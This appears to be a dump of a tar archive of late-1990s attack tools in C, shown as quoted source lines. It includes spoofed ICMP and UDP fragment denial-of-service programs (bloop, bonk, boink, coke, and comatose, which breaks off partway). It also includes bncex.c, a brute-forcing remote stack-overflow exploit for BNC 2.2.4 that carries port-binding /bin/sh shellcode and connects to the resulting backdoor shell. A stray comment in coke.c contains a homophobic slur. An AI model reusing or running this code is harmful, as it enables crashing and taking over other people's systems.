            "#include <stdlib.h>",
            "#include <string.h>",
            "#include <sys/types.h>",
            "#include <sys/time.h>",
            "#include <sys/socket.h>",
            "#include <netdb.h>",
            "#include <netinet/in.h>",
            "#include <netinet/ip.h>",
            "#include <netinet/ip_icmp.h>",
            "void banner(void) {",
            "        ",
            "   printf(\"Bloop v 1.0\\n\\n\");",
            "   printf(\"\\n\\n\");",
            "void usage(const char *progname) {",
            "   printf(\" usage:\\n\");",
            "   printf(\"./bloop [src_ip] [dst_ip] [# of packets]\\n\",progname);",
            "   printf(\" [ip_src] :  ex: 205.56.78.0\\n\");",
            "   printf(\" [ip_dst] :  ex: 201.12.3.76\\n\");",
            "   printf(\" [number]  : 100\\n\");",
            "   printf(\"Legion2000 Security Research (c)\\n\");",
            "int resolve( const char *name, unsigned int port, struct sockaddr_in *addr ) {",
            "   struct hostent *host;",
            "   memset(addr,0,sizeof(struct sockaddr_in));",
            "   addr->sin_family = AF_INET;",
            "   addr->sin_addr.s_addr = inet_addr(name);",
            "   if (addr->sin_addr.s_addr == -1) {",
            "      if (( host = gethostbyname(name) ) == NULL )  {",
            "         fprintf(stderr,\"ERROR: Unable to resolve host %s\\n\",name);",
            "         return(-1);",
            "      }",
            "      addr->sin_family = host->h_addrtype;",
            "      memcpy((caddr_t)&addr->sin_addr,host->h_addr,host->h_length);",
            "   }",
            "   addr->sin_port = htons(port);",
            "   return(0);",
            "unsigned short in_cksum(addr, len)",
            "    u_short *addr;",
            "    int len;",
            "    register int nleft = len;",
            "    register u_short *w = addr;",
            "    register int sum = 0;",
            "    u_short answer = 0;",
            "    while (nleft > 1)  {",
            "        sum += *w++;",
            "        nleft -= 2;",
            "    }",
            "    if (nleft == 1) {",
            "        *(u_char *)(&answer) = *(u_char *)w ;",
            "        sum += answer;",
            "    }",
            "    sum = (sum >> 16) + (sum & 0xffff);",
            "    sum += (sum >> 16);                 ",
            "    answer = ~sum;                      ",
            "    return(answer);",
            "int send_winbomb(int socket,",
            "                 unsigned long spoof_addr,",
            "                 struct sockaddr_in *dest_addr) {",
            "   unsigned char  *packet;",
            "   struct iphdr   *ip;",
            "   struct icmphdr *icmp;",
            "   int rc;",
            "   packet = (unsigned char *)malloc(sizeof(struct iphdr) +",
            "                                    sizeof(struct icmphdr) + 8);",
            "   ip = (struct iphdr *)packet;",
            "   icmp = (struct icmphdr *)(packet + sizeof(struct iphdr));",
            "   memset(ip,0,sizeof(struct iphdr) + sizeof(struct icmphdr) + 8);",
            "   ip->ihl      = 5;",
            "   ip->version  = 4;",
            "// ip->tos      = 2;",
            "   ip->id       = htons(1234);",
            "   ip->frag_off |= htons(0x2000);",
            "// ip->tot_len  = 0;",
            "   ip->ttl      = 30;",
            "   ip->protocol = IPPROTO_ICMP;",
            "   ip->saddr    = spoof_addr;",
            "   ip->daddr    = dest_addr->sin_addr.s_addr;",
            "   ip->check    = in_cksum(ip, sizeof(struct iphdr));",
            "   icmp->type              = 12;",
            "   icmp->code              = 0;",
            "   icmp->checksum          = in_cksum(icmp,sizeof(struct icmphdr) + 1);",
            "   if (sendto(socket,",
            "              packet,",
            "              sizeof(struct iphdr) +",
            "              sizeof(struct icmphdr) + 1,0,",
            "              (struct sockaddr *)dest_addr,",
            "              sizeof(struct sockaddr)) == -1) { return(-1); }",
            "   ip->tot_len  = htons(sizeof(struct iphdr) + sizeof(struct icmphdr) + 8);",
            "   ip->frag_off = htons(8 >> 3);",
            "   ip->frag_off |= htons(0x2000);",
            "   ip->check    = in_cksum(ip, sizeof(struct iphdr));",
            "   icmp->type = 0;",
            "   icmp->code = 0;",
            "   icmp->checksum = 0;",
            "   if (sendto(socket,",
            "              packet,",
            "              sizeof(struct iphdr) +",
            "              sizeof(struct icmphdr) + 8,0,",
            "              (struct sockaddr *)dest_addr,",
            "              sizeof(struct sockaddr)) == -1) { return(-1); }",
            "   free(packet);",
            "   return(0);",
            "int main(int argc, char * *argv) {",
            "   struct sockaddr_in dest_addr;",
            "   unsigned int i,sock;",
            "   unsigned long src_addr;",
            "   banner();",
            "   if ((argc != 4)) {",
            "      usage(argv[0]);",
            "      return(-1);",
            "   }",
            "   if((sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {",
            "      fprintf(stderr,\"ERROR: Opening raw socket.\\n\");",
            "      return(-1);",
            "   }",
            "   if (resolve(argv[1],0,&dest_addr) == -1) { return(-1); }",
            "   src_addr = dest_addr.sin_addr.s_addr;",
            "   if (resolve(argv[2],0,&dest_addr) == -1) { return(-1); }",
            "   printf(\"Status: Connected....packets sent.\\n\",argv[0]);",
            "   for (i = 0;i < atoi(argv[3]);i++) {",
            "      if (send_winbomb(sock,",
            "                       src_addr,",
            "                       &dest_addr) == -1) {",
            "         fprintf(stderr,\"ERROR: Unable to Connect To luser.\\n\");",
            "         return(-1);",
            "      }",
            "     }",
            "datapool/src/bncex.c",
            "0100644",
            "0000000",
            "0000000",
            "00000012476",
            "07100655071",
            "013425",
            "ustar  ",
            "root",
            "root",
            " *  bncex.c - Linux x86 remote BNC 2.2.4 stack overflow ",
            " *  ",
            " *  Notes:",
            " *  Because of the wide variations in offsets between typical vulnerable",
            " *  hosts, this code will brute-force the offset for you (within the range",
            " *  delineated by the MIN_ADDRESS and MAX_OFFSET #define's).",
            " *  ",
            " *  Usage:",
            " *  ./bnc bnc.server.com",
            " *      Uses a destination port of 6668 (bnc's default)",
            " *  ./bnc bnc.server.com 242",
            " *      Uses a destination port of 242",
            " *    ",
            " *  anathema <anathema@box.co.uk>",
            " */   ",
            "#include <stdio.h>",
            "#include <stdlib.h>",
            "#include <unistd.h>",
            "#include <string.h>",
            "#include <errno.h>",
            "#include <sys/types.h>",
            "#include <sys/socket.h>",
            "#include <sys/time.h>",
            "#include <netinet/in.h>",
            "#include <arpa/inet.h>",
            "#include <netdb.h>",
            "#define DEFAULT_BNC_PORT\t\t6668",
            "#define MIN_ADDRESS\t\t\t0xbffff450",
            "#define MAX_OFFSET\t\t\t0x950",
            "#define STEP\t\t\t\t100",
            "#define RETPOS\t\t\t\t1036",
            "#define BD_PRT\t\t\t\t36864",
            "#define DELAY\t\t\t\t1",
            "char c0de[] = /* portshell shellcode, 128 bytes (tcp/36864) */",
            "\"\\xeb\\x72\\x5e\\x29\\xc0\\x89\\x46\\x10\\x40\\x89\\xc3\\x89\\x46\\x0c\\x40\\x89\\x46\\x08\\x8d\"",
            "\"\\x4e\\x08\\xb0\\x66\\xcd\\x80\\x43\\xc6\\x46\\x10\\x10\\x66\\x89\\x5e\\x14\\x88\\x46\\x08\\x29\"",
            "\"\\xc0\\x89\\xc2\\x89\\x46\\x18\\xb0\\x90\\x66\\x89\\x46\\x16\\x8d\\x4e\\x14\\x89\\x4e\\x0c\\x8d\"",
            "\"\\x4e\\x08\\xb0\\x66\\xcd\\x80\\x89\\x5e\\x0c\\x43\\x43\\xb0\\x66\\xcd\\x80\\x89\\x56\\x0c\\x89\"",
            "\"\\x56\\x10\\xb0\\x66\\x43\\xcd\\x80\\x86\\xc3\\xb0\\x3f\\x29\\xc9\\xcd\\x80\\xb0\\x3f\\x41\\xcd\"",
            "\"\\x80\\xb0\\x3f\\x41\\xcd\\x80\\x88\\x56\\x07\\x89\\x76\\x0c\\x87\\xf3\\x8d\\x4b\\x0c\\xb0\\x0b\"",
            "\"\\xcd\\x80\\xe8\\x89\\xff\\xff\\xff/bin/sh\";",
            "u_long",
            "resolve_host(u_char *host_name)",
            "    struct in_addr addr;",
            "    struct hostent *host_ent;",
            "    ",
            "    if ((addr.s_addr = inet_addr(host_name)) == -1)",
            "    {",
            "\thost_ent = gethostbyname(host_name);",
            "\tif (!host_ent) return((u_long)0);",
            "\tmemcpy((char *)&addr.s_addr, host_ent->h_addr, host_ent->h_length);",
            "    }",
            "    ",
            "    return(addr.s_addr);",
            "void",
            "backdoor_connect(u_long dst_ip)",
            "    struct sockaddr_in sin;",
            "    u_char tmp[8192] = {0};",
            "    fd_set fds;",
            "    int sock;",
            "    ",
            "    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);",
            "    if (sock == -1)",
            "    {",
            "\tperror(\"socket allocation\");",
            "\texit(-1);",
            "    }",
            "    ",
            "    sin.sin_family = AF_INET;",
            "    sin.sin_port   = htons(BD_PRT);",
            "    sin.sin_addr.s_addr = dst_ip;",
            "    ",
            "    if (connect(sock, (struct sockaddr *)&sin, sizeof(sin)) == -1)",
            "    {",
            "\tif (errno == ECONNREFUSED) return; ",
            "\tperror(\"connect\");",
            "\texit(-1);",
            "    }",
            "    ",
            "    fprintf(stderr, \"",
            "[1mowned!",
            "[0m\\n\\n\");",
            "    ",
            "    write(sock, \"killall -9 bnc; cd /; uname -a; id;\\n\", 36);",
            "    for (;;)",
            "    {",
            "\tFD_ZERO(&fds);",
            "\tFD_SET(0, &fds);",
            "\tFD_SET(sock, &fds);",
            "\tif ((select(0xff, &fds, NULL, NULL, NULL)) == -1)",
            "\t    perror(\"select\");",
            "\t    exit(-1);",
            "\tmemset(tmp, 0, sizeof(tmp));",
            "\tif (FD_ISSET(sock, &fds))",
            "\t    if (recv(sock, tmp, sizeof(tmp) - 1, 0) == -1)",
            "\t    {",
            "\t\tfprintf(stderr, \"Connection closed by foreign host.\\n\");",
            "\t\tclose(sock); exit(0);",
            "\t    }",
            "\t    ",
            "\t    fprintf(stderr, \"%s\", tmp);",
            "\tif (FD_ISSET(0, &fds))",
            "\t    read(0, tmp, sizeof(tmp)-1);",
            "\t    write(sock, tmp, strlen(tmp));",
            "    }",
            "    ",
            "    /* NOTREACHED */",
            "void",
            "exploit(u_long dst_ip, u_short dst_prt, u_long addr)",
            "    struct sockaddr_in sin;",
            "    u_char buf[4096] = {0};",
            "    int ret = RETPOS, i = 0, sock;",
            "    ",
            "    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);",
            "    if (sock == -1)",
            "    {",
            "\tperror(\"\\nsocket allocation\");",
            "\texit(-1);",
            "    }",
            "    ",
            "    sin.sin_family = AF_INET;",
            "    sin.sin_port   = htons(dst_prt);",
            "    sin.sin_addr.s_addr = dst_ip;",
            "    ",
            "    if (connect(sock, (struct sockaddr *)&sin, sizeof(struct sockaddr)) == -1)",
            "    {",
            "\tperror(\"failed \");",
            "\texit(-1);",
            "    }",
            "    ",
            "    memset(buf, 0x90, ret - strlen(c0de));",
            "    memcpy(buf + ret - strlen(c0de), c0de, strlen(c0de));",
            "    ",
            "    buf[ret++] = (addr & 0xff);",
            "    buf[ret++] = (addr >> 8) & 0xff;",
            "    buf[ret++] = (addr >> 16) & 0xff;",
            "    buf[ret++] = (addr >> 24) & 0xff;",
            "    ",
            "    if (write(sock, buf, strlen(buf)) != strlen(buf))",
            "    {",
            "\tfprintf(stderr, \"\\nerr: truncated write()\\n\");",
            "\texit(-1);",
            "    }",
            "    ",
            "    fprintf(stderr, \"",
            "[32mwaiting",
            "[0m.. \");",
            "    ",
            "    close(sock);",
            "    backdoor_connect(dst_ip);",
            "    fprintf(stderr, \"",
            "[32mno.",
            "[0m\\n\");",
            "main(int argc, char **argv)",
            "    u_long  dst_ip  = 0;",
            "    u_long  addr    = 0;",
            "    u_short dst_prt = DEFAULT_BNC_PORT;",
            "    u_int   offset  = 0;",
            "    u_int   i = 0;",
            "    ",
            "    fprintf(stderr, \"",
            "[31mBNC automated brute-forcing exploit code\\n\"",
            "\t    \"",
            "[32mCopyright (c) anathema <anathema@box.co.uk>",
            "[0m\\n\");",
            "    ",
            "    if (argc != 2 && argc != 3)",
            "    {",
            "\tfprintf(stderr, \"\\nusage:\\t%s dst_host|ip [dst_prt]\\n\", argv[0]);",
            "\texit(-1);",
            "    }",
            "    ",
            "    dst_ip = resolve_host(argv[1]);",
            "    if (argc > 2) dst_prt = (u_short)atoi(argv[2]);",
            "    if (!dst_ip)",
            "    {",
            "\tfprintf(stderr, \"What kind of address is this: `%s`\\n\", argv[1]);",
            "\texit(-1);",
            "    }",
            "    ",
            "    fprintf(stderr, \"",
            "[31m\\nBruteforcing from ",
            "[1m0x%lx to 0x%lx",
            "[31m \"",
            "\t    \"step %d",
            "[0m\\n\", MIN_ADDRESS, MIN_ADDRESS + MAX_OFFSET, STEP);",
            "    ",
            "    for (i = 0; i < MAX_OFFSET; i += STEP)",
            "    {",
            "\taddr = MIN_ADDRESS + i;",
            "\tfprintf(stderr, \"",
            "[32mAttempting to exploit with address\"",
            "\t       \"",
            "[1m 0x%lx",
            "[0m.. \", addr);",
            "\texploit(dst_ip, dst_prt, addr);",
            "    }",
            "    ",
            "    fprintf(stderr, \"\\nCouldn't exploit host `%s`.\\n\", argv[1]);",
            "    exit(0);",
            "/* EOF */",
            "/*                    www.hack.co.za                    */",
            "datapool/src/boink.c",
            "0100644",
            "0000000",
            "0000000",
            "00000013765",
            "07100655103",
            "013426",
            "ustar  ",
            "root",
            "root",
            "  boink.c - a modified bonk.c",
            "    ",
            "    ",
            "                                ==bendi - 1998==",
            "                        bonk.c        -         5/01/1998",
            "        Based On: teardrop.c by route|daemon9 & klepto",
            "        Crashes *patched* win95/(NT?) machines.",
            "        Basically, we set the frag offset > header length (teardrop",
            "        reversed). There are many theories as to why this works,",
            "        however i do not have the resources to perform extensive testing.",
            "        I make no warranties. Use this code at your own risk.",
            "        Rip it if you like, i've had my fun.",
            "    Modified by defile(efnet) [9/01/98]",
            "        ",
            "        As it stood before, bonk.c just simply attacked port 55.",
            "        Upon scanning my associates, I've noticed port 55 isn't",
            "        always open. It varies in fact, while other ports remain",
            "        open and vulnerable to this attack. I realized that Microsoft",
            "        just might fix this by blocking port 55 off or something",
            "        completely lame like that, and that is unacceptable.",
            "        ",
            "        As of this modification, you provide both a \"start\" and a",
            "        \"stop\" port to test for the weakness, in the attempt to catch",
            "        a possibly open port. (I've noticed port 55 seemed to come open",
            "        more frequently on machines that were running IE though)",
            "        ",
            "        Hopefully this will encourage Microsoft to write a REAL fix",
            "        instead of just make lackey fixes as they've had in the past.",
            "        ",
            "        Please only use this to test your own systems for vulnerability,",
            "        and if it is, bitch at Microsoft for a fix. I am not responsible",
            "        for any damage that may come and as stated above by the",
            "        author, this might not even work. I make no claims",
            "        to the ownership to any portions of this source in any way.",
            "        ",
            "        ",
            "#include <stdio.h>",
            "#include <string.h>",
            "#include <netdb.h>",
            "#include <sys/socket.h>",
            "#include <sys/types.h>",
            "#include <netinet/in.h>",
            "#include <netinet/ip.h>",
            "#include <netinet/udp.h>",
            "/*#include <netinet/protocols.h>*/",
            "#include <arpa/inet.h>",
            "#define FRG_CONST       0x3",
            "#define PADDING         0x1c",
            "#define IP_UDP",
            "struct udp_pkt",
            "        struct iphdr    ip;",
            "        struct udphdr   udp;",
            "        char data[PADDING];",
            "} pkt;",
            "int     udplen=sizeof(struct udphdr),",
            "        iplen=sizeof(struct iphdr),",
            "        datalen=100,",
            "        psize=sizeof(struct udphdr)+sizeof(struct iphdr)+PADDING,",
            "        spf_sck;                        /* Socket */",
            "void usage(void)",
            "        /* fprintf(stderr, \"Usage: ./bonk <src_addr> <dst_addr> [num]\\n\"); */",
            "        fprintf (stderr, \"Usage: ./boink <src_addr> <dst_addr> <start_port> <stop_port> [num]\\n\");",
            "        exit(0);",
            "u_long host_to_ip(char *host_name)",
            "        static  u_long ip_bytes;",
            "        struct hostent *res;",
            "        res = gethostbyname(host_name);",
            "        if (res == NULL)",
            "                return (0);",
            "        memcpy(&ip_bytes, res->h_addr, res->h_length);",
            "        return (ip_bytes);",
            "void quit(char *reason)",
            "        perror(reason);",
            "        close(spf_sck);",
            "        exit(-1);",
            "int fondle(int sck, u_long src_addr, u_long dst_addr, int src_prt,",
            "           int dst_prt)",
            "        int     bs;",
            "        struct  sockaddr_in to;",
            "        memset(&pkt, 0, psize);",
            "                                                /* Fill in ip header */",
            "        pkt.ip.version = 4;",
            "        pkt.ip.ihl = 5;",
            "        pkt.ip.tot_len = htons(udplen + iplen + PADDING);",
            "        pkt.ip.id = htons(0x455);",
            "        pkt.ip.ttl = 255;",
            "        pkt.ip.protocol = IP_UDP",
            "        pkt.ip.saddr = src_addr;",
            "        pkt.ip.daddr = dst_addr;",
            "        pkt.ip.frag_off = htons(0x2000);        /* more to come */",
            "        pkt.udp.source = htons(src_prt);        /* udp header */",
            "        pkt.udp.dest = htons(dst_prt);",
            "        pkt.udp.len = htons(8 + PADDING);",
            "                                                /* send 1st frag */",
            "        to.sin_family = AF_INET;",
            "        to.sin_port = src_prt;",
            "        to.sin_addr.s_addr = dst_addr;",
            "        bs = sendto(sck, &pkt, psize, 0, (struct sockaddr *) &to,",
            "                sizeof(struct sockaddr));",
            "        pkt.ip.frag_off = htons(FRG_CONST + 1);         /* shinanigan */",
            "        pkt.ip.tot_len = htons(iplen + FRG_CONST);",
            "                                                        /* 2nd frag */",
            "        bs = sendto(sck, &pkt, iplen + FRG_CONST + 1, 0,",
            "                (struct sockaddr *) &to, sizeof(struct sockaddr));",
            "        return bs;",
            "void main(int argc, char *argv[])",
            "        u_long  src_addr,",
            "                dst_addr;",
            "        int     i,",
            "               /* src_prt = 55,",
            "                  dst_prt = 55, */ ",
            "                start_port,",
            "                stop_port,",
            "                bs = 1,",
            "                pkt_count;",
            "        if (argc < 5)",
            "                usage();",
            "        start_port = (u_short) atoi (argv[ 3 ]);",
            "        stop_port = (u_short) atoi (argv[ 4 ]);        ",
            "        if (argc == 6)",
            "              pkt_count = atoi (argv[ 5 ]);",
            "        ",
            "        ",
            "        if (start_port >= stop_port ||",
            "            stop_port <= start_port) {",
            "                ",
            "                start_port = 25;",
            "                stop_port = 65;",
            "        ",
            "        }",
            "        ",
            "            ",
            "        if (pkt_count == 0)\tpkt_count = 10;",
            "        ",
            "        /* Resolve hostnames */",
            "        src_addr = host_to_ip(argv[1]);",
            "        if (!src_addr)",
            "                quit(\"bad source host\");",
            "        dst_addr = host_to_ip(argv[2]);",
            "        if (!dst_addr)",
            "                quit(\"bad target host\");",
            "        spf_sck = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);",
            "        if (!spf_sck)",
            "                quit(\"socket()\");",
            "        if (setsockopt(spf_sck, IPPROTO_IP, IP_HDRINCL, (char *) &bs,",
            "        sizeof(bs)) < 0)",
            "                quit(\"IP_HDRINCL\");",
            "        for (i = 0; i < pkt_count; ++i)",
            "        {",
            "                int j;",
            "                ",
            "                printf (\"(%d)%s:%d->%d\\n\", i, argv[ 2 ], start_port, stop_port);",
            "                ",
            "                for (j = start_port; j != stop_port; j++) {",
            "                ",
            "                 /* fondle(spf_sck, src_addr, dst_addr, src_prt, dst_prt); */",
            "                    fondle (spf_sck, src_addr, dst_addr, j, j);",
            "                }",
            "                ",
            "        }",
            "        printf(\"Done.\\n\");",
            "datapool/src/bonk.c",
            "0100644",
            "0000000",
            "0000000",
            "00000007747",
            "07100655113",
            "013261",
            "ustar  ",
            "root",
            "root",
            "                                ==bendi - 1998==",
            "                        bonk.c        -         5/01/1998",
            "        Based On: teardrop.c by route|daemon9 & klepto",
            "        Crashes *patched* win95/(NT?) machines.",
            "        Basically, we set the frag offset > header length (teardrop",
            "        reversed). There are many theories as to why this works,",
            "        however i do not have the resources to perform extensive testing.",
            "        I make no warranties. Use this code at your own risk.",
            "        Rip it if you like, i've had my fun.",
            "#include <stdio.h>",
            "#include <string.h>",
            "#include <netdb.h>",
            "#include <sys/socket.h>",
            "#include <sys/types.h>",
            "#include <netinet/in.h>",
            "#include <netinet/ip.h>",
            "#include <netinet/udp.h>",
            "/*#include <netinet/protocols.h>*/",
            "#include <arpa/inet.h>",
            "#define FRG_CONST       0x3",
            "#define PADDING         0x1c",
            "#define IP_UDP",
            "struct udp_pkt",
            "        struct iphdr    ip;",
            "        struct udphdr   udp;",
            "        char data[PADDING];",
            "} pkt;",
            "int     udplen=sizeof(struct udphdr),",
            "        iplen=sizeof(struct iphdr),",
            "        datalen=100,",
            "        psize=sizeof(struct udphdr)+sizeof(struct iphdr)+PADDING,",
            "        spf_sck;                        /* Socket */",
            "void usage(void)",
            "        fprintf(stderr, \"Usage: ./bonk <src_addr> <dst_addr> [num]\\n\");",
            "        exit(0);",
            "u_long host_to_ip(char *host_name)",
            "        static  u_long ip_bytes;",
            "        struct hostent *res;",
            "        res = gethostbyname(host_name);",
            "        if (res == NULL)",
            "                return (0);",
            "        memcpy(&ip_bytes, res->h_addr, res->h_length);",
            "        return (ip_bytes);",
            "void quit(char *reason)",
            "        perror(reason);",
            "        close(spf_sck);",
            "        exit(-1);",
            "int fondle(int sck, u_long src_addr, u_long dst_addr, int src_prt,",
            "           int dst_prt)",
            "        int     bs;",
            "        struct  sockaddr_in to;",
            "        memset(&pkt, 0, psize);",
            "                                                /* Fill in ip header */",
            "        pkt.ip.version = 4;",
            "        pkt.ip.ihl = 5;",
            "        pkt.ip.tot_len = htons(udplen + iplen + PADDING);",
            "        pkt.ip.id = htons(0x455);",
            "        pkt.ip.ttl = 255;",
            "        pkt.ip.protocol = IP_UDP",
            "        pkt.ip.saddr = src_addr;",
            "        pkt.ip.daddr = dst_addr;",
            "        pkt.ip.frag_off = htons(0x2000);        /* more to come */",
            "        pkt.udp.source = htons(src_prt);        /* udp header */",
            "        pkt.udp.dest = htons(dst_prt);",
            "        pkt.udp.len = htons(8 + PADDING);",
            "                                                /* send 1st frag */",
            "        to.sin_family = AF_INET;",
            "        to.sin_port = src_prt;",
            "        to.sin_addr.s_addr = dst_addr;",
            "        bs = sendto(sck, &pkt, psize, 0, (struct sockaddr *) &to,",
            "                sizeof(struct sockaddr));",
            "        pkt.ip.frag_off = htons(FRG_CONST + 1);         /* shinanigan */",
            "        pkt.ip.tot_len = htons(iplen + FRG_CONST);",
            "                                                        /* 2nd frag */",
            "        bs = sendto(sck, &pkt, iplen + FRG_CONST + 1, 0,",
            "                (struct sockaddr *) &to, sizeof(struct sockaddr));",
            "        return bs;",
            "void main(int argc, char *argv[])",
            "        u_long  src_addr,",
            "                dst_addr;",
            "        int     i,",
            "                src_prt=53,",
            "                dst_prt=53,",
            "                bs = 1,",
            "                pkt_count = 10;         /* Default amount */",
            "        if (argc < 3)",
            "                usage();",
            "        if (argc == 4)",
            "                pkt_count = atoi(argv[3]);      /* 10 does the trick */",
            "        /* Resolve hostnames */",
            "        src_addr = host_to_ip(argv[1]);",
            "        if (!src_addr)",
            "                quit(\"bad source host\");",
            "        dst_addr = host_to_ip(argv[2]);",
            "        if (!dst_addr)",
            "                quit(\"bad target host\");",
            "        spf_sck = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);",
            "        if (!spf_sck)",
            "                quit(\"socket()\");",
            "        if (setsockopt(spf_sck, IPPROTO_IP, IP_HDRINCL, (char *) &bs,",
            "        sizeof(bs)) < 0)",
            "                quit(\"IP_HDRINCL\");",
            "        for (i = 0; i < pkt_count; ++i)",
            "        {",
            "                fondle(spf_sck, src_addr, dst_addr, src_prt, dst_prt);",
            "                ",
            "        }",
            "        printf(\"Done.\\n\");",
            "datapool/src/coke.c",
            "0100644",
            "0000000",
            "0000000",
            "00000005124",
            "07100657103",
            "013235",
            "ustar  ",
            "root",
            "root",
            "/*  coke +0.34 by crank and phuzz",
            "bleph...edited by spender...took out some lame shit that made it not work..",
            "blah=\\  works now...heh=P",
            "#include <stdio.h>",
            "#include <netdb.h>",
            "#include <errno.h>",
            "#include <string.h>",
            "#include <stdlib.h>",
            "#include <unistd.h>",
            "#include <sys/socket.h>",
            "#include <netinet/in.h>",
            "/* defines */",
            "#define GARBAGE \"just a bunch of crap really does not matter\"",
            "#define VERSION \"+0.34\"",
            "/* variables */",
            "char\t*buf, *hn;",
            "int\ts, soc, con, i;",
            "int\tcount, x;",
            "int\ttwirl = 3;",
            "int\tcountstr = 0;",
            "/* prototypes */",
            "int\ttwirly(int *twirl);",
            "void\tusage(char *argv[]);",
            "int\tmain(int argc, char *argv[]);",
            "int\tsendPacket(char *buf, char *argv[]);",
            "/* structures */",
            "struct\tsockaddr_in blah;",
            "struct\thostent *hp;",
            "/* let the fun begin */",
            "int\tmain(int argc, char *argv[])",
            "\tif (argc < 3)",
            "\t\tusage(argv);",
            "\t/*  create the garbage */",
            "\tbuf = (char *)malloc(10000); ",
            "\tfor (i = 0; i < 25; i++) ",
            "\t\tstrcat(buf, GARBAGE);",
            "\tstrcat(buf, \"\\n\");",
            "\tprintf(\"coke %s     crank|phuzz\\n\\n\",VERSION);",
            "\tsendPacket(buf,argv);",
            "\tfor (x = 0; x <= count; x++)",
            "\t\tsendPacket(buf,argv);",
            "\t\t/* just purdy stuff */",
            "\t\tfprintf(stderr, \"\\rsending packet: %d (%c)\", x, twirly(&twirl));",
            "\tfprintf(stderr, \"\\rsending packet: %d (caffine will kill you)\",--x);",
            "\tprintf(\"\\n\");",
            "\tclose(soc);",
            "\t/* free up our memory like good programmers */",
            "\tfree(buf);",
            "\t/* done so we wont reach the end of a non-void function */",
            "\texit(0);",
            "int\tsendPacket(char *buf, char *argv[])",
            "\thn = argv[1];",
            "\thp = gethostbyname(hn);",
            "\t/* number of packets to send */",
            "\tcount=(atoi(argv[2]));",
            "\t/*  check target */",
            "\tif (hp==NULL)",
            "\t\tperror(\"coke: gethostbyname()\");",
            "\t\texit(0);",
            "\tbzero((char*)&blah, sizeof(blah));",
            "\tbcopy(hp->h_addr, (char *)&blah.sin_addr, hp->h_length);",
            "\tblah.sin_family = hp->h_addrtype;",
            "\tblah.sin_port = htons(42); ",
            "    ",
            "\t/*  create a socket */",
            "\tsoc = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);",
            "\tif (!soc)",
            "\t\tperror(\"coke: socket()\");",
            "\t\tclose(soc);",
            "\t\texit(1);",
            "\t/*  connect to target */",
            "\tcon = connect(soc, (struct sockaddr *)&blah, sizeof(blah)); ",
            "can u say hello i'm a fag?=\\\tif (!con)",
            "\t\tperror(\"coke: connect()\");",
            "\t\tclose(soc);",
            "\t\texit(1);",
            "*/\tsendto(soc, buf, strlen(buf),0 ,(struct sockaddr *)&blah, sizeof(struct sockaddr));",
            "\tclose(soc);",
            "\treturn(0);",
            "int\ttwirly(int *twirl)",
            "\tif (*twirl > 3) *twirl = 0;",
            "\tswitch ((*twirl)++)",
            "\t\tcase 0: return('|'); break; case 1: return('/'); break;",
            "\t\tcase 2: return('-'); break; case 3: return('\\\\'); break;",
            "\treturn(0);",
            "/* for retards */",
            "void\tusage(char *argv[])",
            "        printf(\"coke %s     crank|phuzz\\n\\nusage: %s <target> <number of packets to send>\\n\",VERSION,argv[0]);",
            "\texit(0);",
            "/* EOF */",
            "datapool/src/comatose.c",
            "0100644",
            "0000000",
            "0000000",
            "00000011401",
            "07100655152",
            "014123",
            "ustar  ",
            "root",
            "root",
            " *  -> PRIVATE. DO NOT USE / DO NOT DISTRIBUTE. <-",
            " *  Copyright (c) anathema <anathema@box.co.uk>. All rights reserved.",
            " *  comatose.c",
            " *  ICMP_PARAMETERPROB based DoS attack (Windows hosts).",
            " */  ",
            "#include <stdio.h>",
            "#include <stdlib.h>",
            "#include <unistd.h>",
            "#include <ctype.h>",
            "#include <fcntl.h>",
            "#include <string.h>",
            "#include <signal.h>",
            "#include <memory.h>",
            "#include <sys/types.h>",
            "#include <sys/socket.h>",
            "#include <sys/ioctl.h>",
            "#include <sys/time.h>",
            "#include <netinet/in.h>",
            "#define __FAVOR_BSD",
            "#define __BSD_SOURCE",
            "#include <netinet/ip.h>",
            "#include <netinet/ip_icmp.h>",
            "#include <arpa/inet.h>",
            "#include <netdb.h>",
            "#define IPHDRLEN\t\tsizeof(struct ip)",
            "#define ICMPHDRLEN\t\tsizeof(struct icmp)",
            "struct",
            "packet",
            "    struct ip ip_hdr;",
            "    struct icmp icmp_hdr;",
            "u_long",
            "resolve_host(u_char *host_name)",
            "    struct in_addr addr;",
            "    struct hostent *host_ent;",
            "    ",
            "    addr.s_addr = inet_addr(host_name);",
            "    if (addr.s_addr == -1)",
            "    {",
            "\thost_ent = gethostbyname(host_name);",
            "\tif (!host_ent) return(-1);",
            "\tmemcpy((char *)&addr.s_addr, host_ent->h_addr, host_ent->h_length);",
            "    }",
            "    ",
            "    return(addr.s_addr);",
            "u_short ",
            "in_cksum(u_short *addr, int len)",
            "    u_short *w = addr, ans = 0;",
            "    int nl = len, sum = 0;",
            "    ",
            "    while (nl > 1)",
            "    {",
            "\tsum += *w++;",
            "\tnl  -= 2;",
            "    }",
            "    ",
            "    if (nl == 1)",
            "    {",
            "\t*(u_char *)(&ans) = *(u_char *)w;",
            "\tsum += ans;",
            "    }",
            "    ",
            "    sum  = (sum >> 16) + (sum & 0xffff);",
            "    sum += (sum >> 16);",
            "    ans  = ~sum;",
            "    ",
            "    return(ans);",
            "void",
            "predator(u_long src_ip, u_long dst_ip)",
            "    struct sockaddr_in sin;",
            "    struct packet pkt;",
            "    int sock;",
            "    ",
            "    sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);",
            "    if (sock == -1)",
            "    {",
            "\tperror(\"socket allocation\");",
            "\texit(-1);",
            "    }",
            "    ",
            "    memset(&sin, 0, sizeof(struct sockaddr_in));",
            "    memset(&pkt, 0, sizeof(struct packet));",
            "    ",
            "    pkt.ip_hdr.ip_v     = 4;",
            "    pkt.ip_hdr.ip_hl    = 5;",
            "    pkt.ip_hdr.ip_len   = htons(IPHDRLEN + ICMPHDRLEN);",
            "    pkt.ip_hdr.ip_id    = htons(rand() % 65535);",
            "    pkt.ip_hdr.ip_off   = htons(IP_MF);",
            "    pkt.ip_hdr.ip_ttl   = 64;",
            "    pkt.ip_hdr.ip_p     = IPPROTO_ICMP;",
            "    pkt.ip_hdr.ip_src.s_addr = src_ip;",
            "    pkt.ip_hdr.ip_dst.s_addr = dst_ip;",
